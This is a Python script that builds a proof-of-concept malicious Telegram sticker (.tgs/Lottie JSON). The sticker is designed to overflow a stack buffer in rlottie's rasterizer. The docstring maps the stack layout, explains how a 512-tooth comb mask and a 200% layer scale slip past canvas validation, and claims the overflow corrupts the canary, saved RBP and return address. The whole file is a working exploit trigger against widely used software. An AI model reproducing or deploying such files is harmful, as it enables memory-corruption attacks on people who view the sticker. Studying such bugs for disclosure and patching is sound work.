#!/usr/bin/env python3
"""
gen_poc_v2_t.py — Tweaked v2 PoC to guarantee stack canary corruption.

Problem with poc_v2.json:
  256 teeth at 1-unit spacing → 2px teeth after 2x scale → [0,0,FF,FF,...] pattern
  → only 256 spans → barely at temp[256] capacity → ~2-byte overflow → misses canary

Fix (poc_v2_t.json):
  512 teeth at 0.5-unit spacing → 1px teeth after 2x scale → [0,FF,0,FF,...] pattern
  → 512 spans into temp[256] → 256 overflow spans = 2048 bytes → smashes canary

Stack layout in rleOpGeneric (with -fstack-protector):
  [low addr]  temp[256] (2048B)  |  array[1024] (1024B)  |  CANARY  |  RBP  |  RIP  [high addr]
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
              overflow writes 2048 bytes past temp → blows through array AND canary

Telegram constraints preserved:
  - Canvas: 512x512 (required)
  - .tgs < 64KB (achieved via gzip)
  - Valid Lottie JSON (rlottie parses it)
  - Layer scale 200% bypasses canvas size validation
"""

import gzip
import io
import json


def make_rect_path(x0, y0, x1, y1):
    verts = [[x0, y0], [x1, y0], [x1, y1], [x0, y1]]
    zeros = [[0, 0]] * 4
    return {"i": zeros, "o": zeros, "v": verts, "c": True}


def make_fine_comb_path(height, n_teeth):
    """
    512 teeth, each 0.5 units wide with 0.5-unit gaps.
    Total: 512 units pre-transform → 1024px after 2x scale.

    After 2x scale each tooth = 1px, each gap = 1px.
    XOR with solid mask produces [0,255,0,255,...] × 512 = 512 spans.
    """
    H = float(height)
    verts = []

    for k in range(n_teeth):
        x_base = float(k)
        x_mid = x_base + 0.5

        verts.append([x_base, 0.0])
        verts.append([x_mid, 0.0])
        verts.append([x_mid, H])
        verts.append([float(k + 1), H])

    verts.append([float(n_teeth), H])
    verts.append([0.0, H])

    n = len(verts)
    zeros = [[0.0, 0.0]] * n
    return {"i": zeros, "o": zeros, "v": verts, "c": True}


def build_lottie():
    W, H = 512, 512
    N_TEETH = 512
    SCALE = 200.0  # 2x

    solid_path = make_rect_path(0, 0, W, H)
    comb_path = make_fine_comb_path(H, N_TEETH)

    sv = lambda v: {"a": 0, "k": v}
    sp = lambda p: {"a": 0, "k": p}

    return {
        "v": "5.5.2",
        "fr": 60,
        "ip": 0,
        "op": 2,
        "w": W,
        "h": H,
        "nm": "rlottie-overflow-v2t",
        "ddd": 0,
        "assets": [],
        "layers": [{
            "ty": 4,
            "nm": "ScaledOverflow",
            "ind": 1,
            "st": 0,
            "ip": 0,
            "op": 2,
            "sr": 1,
            "ks": {
                "p": sv([0, 0, 0]),
                "a": sv([0, 0, 0]),
                "s": sv([SCALE, SCALE, 100]),
                "r": sv(0),
                "o": sv(100),
            },
            "hasMask": True,
            "masksProperties": [
                {
                    "mode": "a",
                    "inv": False,
                    "pt": sp(solid_path),
                    "o": sv(100),
                },
                {
                    "mode": "f",
                    "inv": False,
                    "pt": sp(comb_path),
                    "o": sv(100),
                },
            ],
            "shapes": [{
                "ty": "gr",
                "nm": "G",
                "it": [
                    {
                        "ty": "rc",
                        "nm": "Rect",
                        "p": sv([256.0, 256.0]),
                        "s": sv([512, 512]),
                        "r": sv(0),
                    },
                    {
                        "ty": "fl",
                        "nm": "Fill",
                        "c": sv([1, 0, 0, 1]),
                        "o": sv(100),
                        "r": 1,
                    },
                ],
            }],
        }],
    }


def main():
    lottie = build_lottie()
    json_bytes = json.dumps(lottie, separators=(",", ":")).encode("utf-8")

    json_path = "poc_v2_t.json"
    tgs_path = "poc_v2_t.tgs"

    with open(json_path, "wb") as f:
        f.write(json_bytes)

    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb", mtime=0) as gz:
        gz.write(json_bytes)
    tgs_bytes = buf.getvalue()

    with open(tgs_path, "wb") as f:
        f.write(tgs_bytes)

    comb_verts = lottie["layers"][0]["masksProperties"][1]["pt"]["k"]["v"]
    n_verts = len(comb_verts)
    n_teeth = (n_verts - 2) // 4

    print(f"=== poc_v2_t — Canary-reaching PoC ===\n")
    print(f"  Canvas:              512 x 512")
    print(f"  Layer scale:         2x (200%)")
    print(f"  Comb teeth:          {n_teeth} (0.5-unit spacing)")
    print(f"  Comb vertices:       {n_verts}")
    print(f"  Effective width:     1024px (after transform)")
    print(f"  Coverage pattern:    [0,FF,0,FF,...] x 512 pixels")
    print(f"  Spans produced:      512")
    print(f"  temp[] capacity:     256 spans (2048 bytes)")
    print(f"  OVERFLOW:            256 spans = 2048 bytes")
    print(f"")
    print(f"  JSON size:           {len(json_bytes):,} bytes")
    print(f"  TGS size:            {len(tgs_bytes):,} bytes")
    print(f"  TGS < 64KB:          {'PASS' if len(tgs_bytes) < 65536 else 'FAIL'}")
    print(f"")
    print(f"  Stack geometry (rleOpGeneric with -fstack-protector):")
    print(f"    temp[256]          2048 bytes  ← overflow starts here")
    print(f"    array[1024]        1024 bytes  ← overflow continues through")
    print(f"    canary               8 bytes  ← CORRUPTED (offset ~1024-1032)")
    print(f"    saved RBP            8 bytes  ← CORRUPTED")
    print(f"    saved RIP            8 bytes  ← CORRUPTED")
    print(f"    overflow total:    2048 bytes >> 1032 needed")
    print(f"")
    print(f"  [+] {json_path}  ({len(json_bytes):,} bytes)")
    print(f"  [+] {tgs_path}  ({len(tgs_bytes):,} bytes)")


if __name__ == "__main__":
    main()
